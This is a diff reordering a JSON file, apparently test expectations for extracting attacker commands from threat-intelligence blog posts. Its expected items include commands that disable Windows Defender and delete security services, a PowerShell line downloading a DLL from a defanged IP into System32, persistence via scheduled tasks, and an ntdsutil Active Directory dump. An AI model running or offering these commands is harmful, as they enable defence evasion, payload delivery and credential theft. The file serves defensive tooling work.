@@ -1,45 +1,5 @@
 [
   {
-    "url": "https://www.huntress.com/blog/why-old-ransomware-playbooks-never-die",
-    "expected_items": [
-      "C:\\Temp\\file.exe -n=15 -p=F",
-      "reg add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\SpyNet\" /v \"SubmitSamplesConsent\" /d \"0\"",
-      "reg add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\Reporting\" /v \"DisableEnhancedNotifications\" /t REG_DWORD /d \"1\" /f",
-      "reg add \"HKLM\\System\\CurrentControlSet\\Services\\WinDefend\" /v \"Start\" /t REG_DWORD /d \"4\" /f",
-      "reg delete \"HKCR\\*\\shellex\\ContextMenuHandlers\\EPP\" /f",
-      "reg delete \"HKCR\\Directory\\shellex\\ContextMenuHandlers\\EPP\" /f",
-      "reg delete \"HKCR\\Drive\\shellex\\ContextMenuHandlers\\EPP\" /f",
-      "reg delete \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v \"Windows Defender\" /f",
-      "reg add \"HKLM\\System\\CurrentControlSet\\Control\\WMI\\Autologger\\DefenderApiLogger\" /v \"Start\" /t REG_DWORD /d \"0\" /f",
-      "reg add \"HKLM\\System\\CurrentControlSet\\Control\\WMI\\Autologger\\DefenderAuditLogger\" /v \"Start\" /t REG_DWORD /d \"0\" /f",
-      "bcdedit /set {current} disableelamdrivers yes",
-      "reg add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\UX Configuration\" /v \"Notification_Suppress\" /t REG_DWORD /d \"1\" /f",
-      "reg add \"HKLM\\SYSTEM\\ControlSet001\\Services\\MsSecFlt\" /v \"Start\" /t REG_DWORD /d \"4\" /f",
-      "reg add \"HKLM\\System\\CurrentControlSet\\Services\\Sense\" /v \"Start\" /t REG_DWORD /d \"4\" /f",
-      "sc delete Sense",
-      "sc delete SgrmAgent",
-      "sc delete SgrmBroker",
-      "schtasks /Change /TN \"Microsoft\\Windows\\ExploitGuard\\ExploitGuard MDM policy Refresh\" /Disable",
-      "schtasks /Change /TN \"Microsoft\\Windows\\Windows Defender\\Windows Defender Cache Maintenance\" /Disable",
-      "schtasks /Change /TN \"Microsoft\\Windows\\Windows Defender\\Windows Defender Cleanup\" /Disable",
-      "schtasks /Change /TN \"Microsoft\\Windows\\Windows Defender\\Windows Defender Scheduled Scan\" /Disable",
-      "schtasks /Change /TN \"Microsoft\\Windows\\Windows Defender\\Windows Defender Verification\" /Disable"
-    ]
-  },
-  {
-    "url": "https://levelblue.com/blogs/spiderlabs-blog/malicious-screen-connect-campaign-abuses-ai-themed-lures-for-xworm-delivery",
-    "expected_items": [
-      "\"ScreenConnect.ClientService.exe\" \"?e=Access&y=Guest&h=instance-keoxeq-relay[.]screenconnect[.]com&p=443&s=44f &k=BgIAAA &c=GROKgpt\""
-    ]
-  },
-  {
-    "url": "https://www.fortinet.com/blog/threat-research/unveiling-a-new-variant-of-the-darkcloud-campaign",
-    "expected_items": [
-      "powershell -w hidden -noprofile -ep bypass -c",
-      "copy *.js C:\\Users\\Public\\Downloads\\edriophthalma.js"
-    ]
-  },
-  {
     "url": "https://cloud.google.com/blog/topics/threat-intelligence/analysis-of-unc1549-ttps-targeting-aerospace-defense",
     "expected_items": [
       "net user DC-01$ P@ssw0rd",
@@ -50,24 +10,9 @@
     ]
   },
   {
-    "url": "https://www.proofpoint.com/us/blog/threat-insight/bitter-end-unraveling-eight-years-espionage-antics-part-one",
-    "expected_items": []
-  },
-  {
-    "url": "https://www.fortinet.com/blog/threat-research/teamcity-intrusion-saga-apt29-suspected-exploiting-cve-2023-42793",
+    "url": "https://levelblue.com/blogs/spiderlabs-blog/malicious-screen-connect-campaign-abuses-ai-themed-lures-for-xworm-delivery",
     "expected_items": [
-      "ipconfig /all",
-      "ipconfig /displaydns",
-      "tasklist /svc",
-      "netstat -ano",
-      "net user /domain",
-      "net user",
-      "powershell -exec bypass -c \"Invoke-WebRequest -Uri hxxp[:]//103[.]76[.]128[.]34:8080/AclNumsInvertHost.dll -OutFile C:\\Windows\\System32\\AclNumsInvertHost.dll\"",
-      "schtasks.exe /create /SC ONLOGON /tn \"\\Microsoft\\Windows\\DefenderUPDService\" /tr \"\\\"C:\\Windows\\system32\\rundll32.exe\\\" \\\"C:\\Windows\\system32\\AclNumsInvertHost.dll\\\",AclNumsInvertHost\"",
-      "schtasks.exe /run /tn \"\\Microsoft\\Windows\\DefenderUPDService\"",
-      "schtasks.exe /create /SC ONSTART /tn \"\\Microsoft\\Windows\\IISUpdateService\" /tr \"C:\\Windows\\WinStore\\iisexpresstray.exe\" /RU \"SYSTEM\" /f",
-      "schtasks.exe /run /tn \"\\Microsoft\\Windows\\IISUpdateService\"",
-      "ntdsutil.exe 'ac i ntds' 'ifm' 'create full C:\\tempp' q q"
+      "\"ScreenConnect.ClientService.exe\" \"?e=Access&y=Guest&h=instance-keoxeq-relay[.]screenconnect[.]com&p=443&s=44f &k=BgIAAA &c=GROKgpt\""
     ]
   },
   {
@@ -124,6 +69,61 @@
   },
   {
     "url": "https://www.elastic.co/security-labs/roningloader",
+    "expected_items": []
+  },
+  {
+    "url": "https://www.fortinet.com/blog/threat-research/teamcity-intrusion-saga-apt29-suspected-exploiting-cve-2023-42793",
+    "expected_items": [
+      "ipconfig /all",
+      "ipconfig /displaydns",
+      "tasklist /svc",
+      "netstat -ano",
+      "net user /domain",
+      "net user",
+      "powershell -exec bypass -c \"Invoke-WebRequest -Uri hxxp[:]//103[.]76[.]128[.]34:8080/AclNumsInvertHost.dll -OutFile C:\\Windows\\System32\\AclNumsInvertHost.dll\"",
+      "schtasks.exe /create /SC ONLOGON /tn \"\\Microsoft\\Windows\\DefenderUPDService\" /tr \"\\\"C:\\Windows\\system32\\rundll32.exe\\\" \\\"C:\\Windows\\system32\\AclNumsInvertHost.dll\\\",AclNumsInvertHost\"",
+      "schtasks.exe /run /tn \"\\Microsoft\\Windows\\DefenderUPDService\"",
+      "schtasks.exe /create /SC ONSTART /tn \"\\Microsoft\\Windows\\IISUpdateService\" /tr \"C:\\Windows\\WinStore\\iisexpresstray.exe\" /RU \"SYSTEM\" /f",
+      "schtasks.exe /run /tn \"\\Microsoft\\Windows\\IISUpdateService\"",
+      "ntdsutil.exe 'ac i ntds' 'ifm' 'create full C:\\tempp' q q"
+    ]
+  },
+  {
+    "url": "https://www.fortinet.com/blog/threat-research/unveiling-a-new-variant-of-the-darkcloud-campaign",
+    "expected_items": [
+      "powershell -w hidden -noprofile -ep bypass -c",
+      "copy *.js C:\\Users\\Public\\Downloads\\edriophthalma.js"
+    ]
+  },
+  {
+    "url": "https://www.huntress.com/blog/why-old-ransomware-playbooks-never-die",
+    "expected_items": [
+      "C:\\Temp\\file.exe -n=15 -p=F",
+      "reg add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\SpyNet\" /v \"SubmitSamplesConsent\" /d \"0\"",
+      "reg add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\Reporting\" /v \"DisableEnhancedNotifications\" /t REG_DWORD /d \"1\" /f",
+      "reg add \"HKLM\\System\\CurrentControlSet\\Services\\WinDefend\" /v \"Start\" /t REG_DWORD /d \"4\" /f",
+      "reg delete \"HKCR\\*\\shellex\\ContextMenuHandlers\\EPP\" /f",
+      "reg delete \"HKCR\\Directory\\shellex\\ContextMenuHandlers\\EPP\" /f",
+      "reg delete \"HKCR\\Drive\\shellex\\ContextMenuHandlers\\EPP\" /f",
+      "reg delete \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v \"Windows Defender\" /f",
+      "reg add \"HKLM\\System\\CurrentControlSet\\Control\\WMI\\Autologger\\DefenderApiLogger\" /v \"Start\" /t REG_DWORD /d \"0\" /f",
+      "reg add \"HKLM\\System\\CurrentControlSet\\Control\\WMI\\Autologger\\DefenderAuditLogger\" /v \"Start\" /t REG_DWORD /d \"0\" /f",
+      "bcdedit /set {current} disableelamdrivers yes",
+      "reg add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\UX Configuration\" /v \"Notification_Suppress\" /t REG_DWORD /d \"1\" /f",
+      "reg add \"HKLM\\SYSTEM\\ControlSet001\\Services\\MsSecFlt\" /v \"Start\" /t REG_DWORD /d \"4\" /f",
+      "reg add \"HKLM\\System\\CurrentControlSet\\Services\\Sense\" /v \"Start\" /t REG_DWORD /d \"4\" /f",
+      "sc delete Sense",
+      "sc delete SgrmAgent",
+      "sc delete SgrmBroker",
+      "schtasks /Change /TN \"Microsoft\\Windows\\ExploitGuard\\ExploitGuard MDM policy Refresh\" /Disable",
+      "schtasks /Change /TN \"Microsoft\\Windows\\Windows Defender\\Windows Defender Cache Maintenance\" /Disable",
+      "schtasks /Change /TN \"Microsoft\\Windows\\Windows Defender\\Windows Defender Cleanup\" /Disable",
+      "schtasks /Change /TN \"Microsoft\\Windows\\Windows Defender\\Windows Defender Scheduled Scan\" /Disable",
+      "schtasks /Change /TN \"Microsoft\\Windows\\Windows Defender\\Windows Defender Verification\" /Disable"
+    ]
+  },
+  {
+    "url": "https://www.proofpoint.com/us/blog/threat-insight/bitter-end-unraveling-eight-years-espionage-antics-part-one",
     "expected_items": []
   }
 ]
